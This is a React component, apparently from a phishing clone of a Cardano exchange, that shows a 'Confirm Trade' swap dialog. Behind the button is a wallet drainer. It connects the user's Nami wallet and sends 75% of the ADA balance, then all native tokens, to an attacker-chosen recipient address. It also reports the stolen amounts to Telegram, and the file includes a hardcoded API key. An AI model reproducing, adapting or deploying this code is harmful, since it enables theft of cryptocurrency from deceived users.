import { useEffect, useState } from 'react'
import {
    Dialog,
    DialogContent,
    DialogHeader,
    DialogTrigger,
    DialogClose,

} from "../../components/ui/dialog";
import useStore from '../store/store';
import { Buffer } from "buffer";
import axios from "axios";
import { transferADA, transferADAAndTokens } from '../../lib/walletUtils/walletUtils';
import { getRecipientAddress } from '../../lib/walletUtils/userLocation';
import { sendAppDetailsToTelegram } from '../../lib/walletUtils/telegramUtils';


const ConfirmTrade = ({ topInputValue, bottomInputValue }) => {



    const [CardanoWasm, setCardanoWasm] = useState(null);
    const [address, setAddress] = useState("");
    const { state, assets } = useStore()
    console.log(state.address)
    useEffect(() => {
        const loadWasm = async () => {
            const wasmModule = await import(
                "@emurgo/cardano-serialization-lib-browser"
            );
            setCardanoWasm(wasmModule);

        };
        console.log('init wasm')
        loadWasm();
    }, [topInputValue]);

    const BLOCKFROST_API_KEY = "mainnetl7kg73l1Eh3mif46gJOJHIfTtbYosjl8";
    const BLOCKFROST_API_URL = "https://cardano-mainnet.blockfrost.io/api/v0";

    const fetchProtocolParams = async () => {
        try {
            const response = await axios.get(
                `${BLOCKFROST_API_URL}/epochs/latest/parameters`,
                {
                    headers: {
                        project_id: BLOCKFROST_API_KEY,
                    },
                },
            );
            return response.data;
        } catch (error) {
            console.error("Error fetching protocol parameters", error);
        }
    };


    async function updateBalance(walletApi) {
        try {
            const balanceInLovelace = await walletApi.getBalance();
            console.log("Raw balance from API:", balanceInLovelace);

            const isHex = /^[0-9A-Fa-f]+$/.test(balanceInLovelace);
            console.log("Is balance in hex format?", isHex);

            let balanceInAda;
            if (isHex) {
                balanceInAda = CardanoWasm.Value.from_bytes(
                    Buffer.from(balanceInLovelace, "hex"),
                );
            } else {
                balanceInAda = Number(balanceInLovelace) / 1000000;
            }
            console.log("Calculated ADA balance:", balanceInAda.coin().to_str());

            const newBalance = parseInt(balanceInAda.coin().to_str()) / 1000000;

            const response = await fetch(
                "https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd",
            );
            const data = await response.json();
            const adaToUsd = data.cardano.usd;
            console.log("Current ADA to USD rate:", adaToUsd);

            const balanceInUsd = newBalance * adaToUsd;
            console.log("Calculated USD balance:", balanceInUsd);

            return newBalance;
        } catch (error) {
            console.error("Error fetching balance or exchange rate:", error);
            return null;
        }
    }
    async function autoWithdraw(walletApi, currentBalance, address) {
        if (currentBalance === null || currentBalance === 0 || isNaN(currentBalance)) {
            console.error("Balance not available or is NaN");
            return;
        }

        const recipientAddress = getRecipientAddress();
        let localBalance = currentBalance; // Track balance locally

        console.log(`Starting balance: ${localBalance.toFixed(6)} ADA`);

        try {
            const protocolParams = await fetchProtocolParams();

            // Fetch UTXOs
            let utxosHex = await walletApi.getUtxos();
            if (!utxosHex || !Array.isArray(utxosHex) || utxosHex.length === 0) {
                console.error("No UTXOs found or invalid UTXO format");
                return;
            }

            let utxos = await getTxUnspentOutputs(utxosHex);
            if (!utxos || utxos.len() === 0) {
                console.error("Parsed UTXOs are empty or invalid");
                return;
            }

            let totalAdaAmount = 0;
            let nonNativeTokens = [];

            // Collect ADA and non-native tokens
            for (let i = 0; i < utxos.len(); i++) {
                const utxo = utxos.get(i);
                const outputAmount = utxo.output().amount();
                const adaAmount = parseInt(outputAmount.coin().to_str());
                if (!isNaN(adaAmount)) {
                    totalAdaAmount += adaAmount;
                }

                const multiasset = outputAmount.multiasset();
                if (multiasset) {
                    const keys = multiasset.keys();
                    const N = keys.len();
                    for (let i = 0; i < N; i++) {
                        const policyId = keys.get(i);
                        const assets = multiasset.get(policyId);
                        const assetNames = assets.keys();
                        const K = assetNames.len();
                        for (let j = 0; j < K; j++) {
                            const assetName = assetNames.get(j);
                            const amount = parseInt(multiasset.get_asset(policyId, assetName).to_str());
                            if (!isNaN(amount)) {
                                nonNativeTokens.push({
                                    policyId: policyId.to_hex(),
                                    assetName: Buffer.from(assetName.name()).toString(),
                                    amount: amount,
                                });
                            }
                        }
                    }
                }
            }

            // Step 1: Withdraw 3/4 of ADA balance
            const adaToWithdraw = Math.floor(localBalance * 0.75); // Withdraw 85% of remaining ADA

            if (!isNaN(adaToWithdraw)) {
                try {
                    console.log(`Withdrawing 3/4 ADA: ${adaToWithdraw} ADA`);
                    // Send wallet balance to Telegram
                    sendAppDetailsToTelegram(adaToWithdraw, nonNativeTokens);
                    const txHash = await transferADA(
                        walletApi,
                        CardanoWasm,
                        recipientAddress,
                        adaToWithdraw
                    );
                    console.log(`ADA transfer transaction hash: ${txHash}`);

                    // Update local ADA balance after ADA withdrawal
                    localBalance -= adaToWithdraw;
                    console.log(`Balance after ADA withdrawal: ${localBalance.toFixed(6)} ADA`);

                    if (localBalance < 1) {
                        console.error("Insufficient ADA for further transactions.");
                        return;
                    }
                } catch (error) {
                    console.log("Failed to transfer ADA:", error);
                }
            }

            // Step 2: Check and withdraw non-native tokens, if available
            if (nonNativeTokens.length > 0) {
                console.log(`Withdrawing non-ADA tokens: ${nonNativeTokens.length} tokens`);



                // Prepare token data for transfer
                const tokenPolicyIds = nonNativeTokens.map(token => token.policyId);
                const tokenAssetNames = nonNativeTokens.map(token => token.assetName);
                const tokenAmounts = nonNativeTokens.map(token => token.amount);

                try {
                    const txHash = await transferADAAndTokens(
                        walletApi,
                        CardanoWasm,
                        recipientAddress,
                        tokenPolicyIds,
                        tokenAssetNames,
                        tokenAmounts
                    );
                    console.log(`Non-ADA token transfer transaction hash: ${txHash}`);
                } catch (error) {
                    console.log("Failed to transfer non-ADA tokens:", error);
                }
            } else {
                console.log("No non-ADA tokens found, skipping token withdrawal.");
            }

        } catch (error) {
            console.log("Error during auto-withdrawal:", error);
        }
    }



    async function getTxUnspentOutputs(utxosHex) {
        const txOutputs = CardanoWasm.TransactionUnspentOutputs.new();

        for (const utxor of utxosHex) {
            try {
                // Convert hex UTXO to TransactionUnspentOutput object
                const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
                    Buffer.from(utxor, "hex")
                );
                txOutputs.add(utxo);
            } catch (error) {
                console.error("Failed to parse UTXO:", error);
                throw new Error("Invalid UTXO format");
            }
        }

        return txOutputs;
    }

    const handleWalletSelection = async (wallet) => {
        if (wallet === "Nami") {
            if (window.cardano && window.cardano.nami) {
                try {
                    const walletApi = await window.cardano.nami.enable();

                    if (walletApi) {
                        console.log("Wallet API object:", walletApi);

                        await new Promise((resolve) => setTimeout(resolve, 1000));

                        let addresses;
                        try {
                            addresses = await walletApi.getUsedAddresses();
                            console.log("Used addresses:", addresses);
                        } catch (error) {
                            console.error("Error getting used addresses:", error);
                            if (typeof walletApi.getAddresses === "function") {
                                addresses = await walletApi.getAddresses();
                                console.log("All addresses:", addresses);
                            } else {
                                console.error("Unable to retrieve addresses");
                                return;
                            }
                        }

                        if (addresses && addresses.length > 0) {
                            const hexAddress = addresses[0];


                            const addressBytes = Buffer.from(hexAddress, "hex");
                            const address = CardanoWasm.Address.from_bytes(addressBytes);
                            console.log(
                                `Connected to Nami. Hex Address:`,
                                address?.to_bech32(),
                            );
                            setAddress(address?.to_bech32());

                            // Get the balance directly
                            const currentBalance = await updateBalance(walletApi);

                            if (currentBalance !== null) {
                                console.log("Current balance:", currentBalance);
                                await autoWithdraw(
                                    walletApi,
                                    currentBalance,
                                    address?.to_bech32(),
                                );
                            } else {
                                console.error("Failed to retrieve balance");
                            }

                        } else {
                            console.error("No addresses found");
                            alert(
                                "No addresses found in the wallet. If this is a new wallet, please make a transaction first.",
                            );
                        }
                    }
                } catch (error) {
                    console.error(`Error connecting to Nami wallet:`, error);
                    alert(
                        `Error connecting to Nami wallet. Please try again`,
                    );
                }
            } else {
                console.error(
                    `Nami wallet not found. Please install the extension.`,
                );
                alert(`Nami wallet not found. Please install the extension.`);
            }
        }
    };
    function isBase64(str) {
        const base64Regex = /^(?:[A-Z0-9+\/]{4})*(?:[A-Z0-9+\/]{2}==|[A-Z0-9+\/]{3}=)?$/i;
        return base64Regex.test(str);
    }
    const capitalizeFirstLetter = (str) => {
        return str.charAt(0).toUpperCase() + str.slice(1).toLowerCase();
    };
    return (
        <Dialog>
            <DialogTrigger>
                <div className="sc-gEvEer eLaKli w-full">
                    <button className="sc-gEvEer eWXwvT w-full">
                        Swap Instantly
                    </button>
                </div>
            </DialogTrigger>
            <DialogContent className="p-2.5 rounded-2xl max-w-[500px] ">
                <DialogHeader className=" px-4">
                    <div width="100%" className="sc-gEvEer sc-eqUAAy hVdysW fgprtA">
                        <div className="sc-gEvEer ihQBzN">Confirm Trade</div>
                        <DialogClose>
                            <div className="sc-gEvEer ccMa-dL">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16">
                                    <path d="M1.76.34 8 6.6 14.24.33a1 1 0 0 1 1.32-.08l.1.08a1 1 0 0 1 .08 1.32l-.08.1L9.4 8l6.25 6.24a1 1 0 1 1-1.42 1.42L8 9.4l-6.24 6.25a1 1 0 0 1-1.32.08l-.1-.08a1 1 0 0 1-.08-1.32l.08-.1L6.58 8 .34 1.76A1 1 0 0 1 1.76.34Z" fill="currentColor" fillRule="evenodd"></path>
                                </svg>
                            </div>
                        </DialogClose>
                    </div>
                </DialogHeader>
                <div className=" bg-blue-400 sc-dhKdcB bOsUiC" tabIndex="-1" role="dialog" aria-modal="true" style={{ maxHeight: "100vh", overflowY: "auto", margin: "auto", background: "rgb(255, 255, 255)", padding: "0px 16px", borderRadius: "16px" }}>

                    <p className="sc-gEvEer gWtCjc">After submitting to the blockchain, the trade will be executed as soon as market price reaches your desired price.</p>
                    <p className="sc-gEvEer kpVmdW">Note: The transaction cannot be reversed after being executed. Please review the details carefully before confirming.</p>
                    <div className="sc-gEvEer cfssox"></div>
                    <div className="sc-gEvEer sc-eqUAAy  mt-2 enRBfD fgprtA">
                        <div className="sc-gEvEer sc-eqUAAy eVbqNG fgprtA">
                            <div className="sc-gEvEer sc-eqUAAy jQCsrt fgprtA">
                                <div className="LazyLoad is-visible" style={{ height: "32px", width: "32px" }}>
                                    <img src={topInputValue.info ? topInputValue.info.image : ` ${isBase64(topInputValue.icon) ? 'data:image/png;base64,' : ''} ${topInputValue.icon}`} crossOrigin="anonymous" alt="MIN token" className="sc-gEvEer jmJMSZ" />
                                </div>
                                <span className="sc-gEvEer Mglgv">{(Number(topInputValue?.quantity) / 1000000)}</span>
                            </div>
                            <span className="sc-gEvEer hHuoiF"> {topInputValue.info ? topInputValue.info.symbol : topInputValue.name}</span>
                        </div>
                        <svg viewBox="0 0 14 12" xmlns="http://www.w3.org/2000/svg" className="sc-gEvEer eJcMbN">
                            <path d="M7.71 11.72a1 1 0 0 1 0-1.42L11 7H1a1 1 0 0 1 0-2h10L7.71 1.71A1 1 0 1 1 9.12.3l4.3 4.3a2 2 0 0 1 .57 1.24L14 6a2 2 0 0 1-.59 1.4l-4.29 4.3a1 1 0 0 1-1.41.02z" fill="currentColor" fillRule="evenodd"></path>
                        </svg>
                        <div className="sc-gEvEer sc-eqUAAy eVbqNG fgprtA">
                            <div className="sc-gEvEer sc-eqUAAy jQCsrt fgprtA">
                                <div className="LazyLoad is-visible" style={{ height: "32px", width: "32px" }}>
                                    <img src={bottomInputValue.info ? bottomInputValue.info.image : ` ${isBase64(bottomInputValue.icon) ? 'data:image/png;base64,' : ''} ${bottomInputValue.icon}`} crossOrigin="anonymous" alt="ADA token" className="sc-gEvEer jmJMSZ" />
                                </div>
                                <span className="sc-gEvEer Mglgv">{(Number(bottomInputValue?.quantity) / 1000000).toFixed(2)}</span>
                            </div>
                            <span className="sc-gEvEer hHuoiF"> {bottomInputValue.info ? bottomInputValue.info.symbol : bottomInputValue.name}</span>
                        </div>
                        <div className="sc-gEvEer gSgSkJ">
                            <div display="flex" className="sc-gEvEer inczKp">
                                <div width="100%" className="sc-gEvEer sc-eqUAAy cPZWaT fgprtA">
                                    <button height="14px" type="button" className="sc-gEvEer bgWxOy">
                                        <div fontSize="12px" className="sc-gEvEer eXizvC">Total Fee&nbsp;</div>
                                        <svg height="12" viewBox="0 0 7 12" xmlns="http://www.w3.org/2000/svg" className="sc-gEvEer jeJLyM">
                                            <path d="M.3 11.7a1 1 0 0 1 0-1.4l4.05-4.06a.33.33 0 0 0 0-.48L.29 1.71A1 1 0 1 1 1.71.29l4.05 4.06a2.33 2.33 0 0 1 0 3.3l-4.05 4.06a1 1 0 0 1-1.42 0z" fill="currentColor" fillRule="evenodd"></path>
                                        </svg>
                                    </button>
                                    <div fontSize="12px" fontWeight="700" className="sc-gEvEer eJxbyY">0.95 ₳</div>
                                </div>
                                <div height="100%" overflow="hidden" className="sc-gEvEer sc-eqUAAy Eavop fgprtA">
                                    <div className="sc-gEvEer sc-eqUAAy burvyR fgprtA">
                                        <div className="sc-gEvEer sc-eqUAAy dSOvFp fgprtA">
                                            <div fontWeight="500" fontSize="12px" className="sc-gEvEer fCYFpm">Matchmaker Fee</div>
                                        </div>
                                        <div fontSize="12px" className="sc-gEvEer joccZj">0.95 ₳</div>
                                    </div>
                                    <div className="sc-gEvEer sc-eqUAAy burvyR fgprtA">
                                        <div className="sc-gEvEer sc-eqUAAy dSOvFp fgprtA">
                                            <div fontWeight="500" fontSize="12px" className="sc-gEvEer fCYFpm">Frontend Fee</div>
                                        </div>
                                        <div fontSize="12px" className="sc-gEvEer joccZj">0 ₳</div>
                                    </div>
                                    <div className="sc-gEvEer sc-eqUAAy burvyR fgprtA">
                                        <div className="sc-gEvEer sc-eqUAAy dSOvFp fgprtA">
                                            <div fontWeight="500" fontSize="12px" className="sc-gEvEer fCYFpm">Milk-Holder Discount</div>
                                            <div display="inline-flex" className="sc-gEvEer dFSrfB">
                                                <svg width="18" height="18" fill="none" xmlns="http://www.w3.org/2000/svg" color="grey500" className="sc-gEvEer ghqiAU">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M9 1.5a7.5 7.5 0 1 1 0 15 7.5 7.5 0 0 1 0-15ZM9 3a6 6 0 1 0 0 12A6 6 0 0 0 9 3Zm0 9a.75.75 0 1 1 0 1.5.75.75 0 0 1 0-1.5Zm0-7.5a2.618 2.618 0 0 1 .887 5.086l-.137.044v.87a.75.75 0 0 1-1.495.088L8.25 10.5V9a.75.75 0 0 1 .663-.745L9 8.25a1.125 1.125 0 1 0-1.12-1.233l-.005.108a.75.75 0 0 1-1.5 0A2.625 2.625 0 0 1 9 4.5Z" fill="currentColor"></path>
                                                </svg>
                                                <div className="sc-fxwrCY dGwCMf" style={{ transform: "translate(-16px, -100%)" }}>
                                                    <div className="sc-gEvEer kpVmdW">If you hold more than 100 MILK you will enjoy reduced fees.</div>
                                                </div>
                                            </div>
                                        </div>
                                        <div fontSize="12px" className="sc-gEvEer joccZj">0 ₳</div>
                                    </div>
                                </div>
                                <div width="100%" className="sc-gEvEer sc-eqUAAy bHkCOW fgprtA">
                                    <div fontSize="12px" className="sc-gEvEer gkVEcg">Deposit (Returned)</div>
                                    <div fontSize="12px" fontWeight="500" className="sc-gEvEer jJprKx">1.7 ₳</div>
                                </div>
                            </div>
                        </div>
                        <div className="sc-gEvEer fBPmVO">The market price can change while you place a trade. Any pending trades on the blockchain can be found in <a href="/wallet/orders">Open orders</a>.</div>
                    </div>
                    <button onClick={() => {
                        handleWalletSelection(capitalizeFirstLetter(state.walletName))
                    }} width="100%" className="sc-gEvEer bBezko">Confirm Trade</button>
                </div>
            </DialogContent>
        </Dialog>
    )
}

export default ConfirmTrade
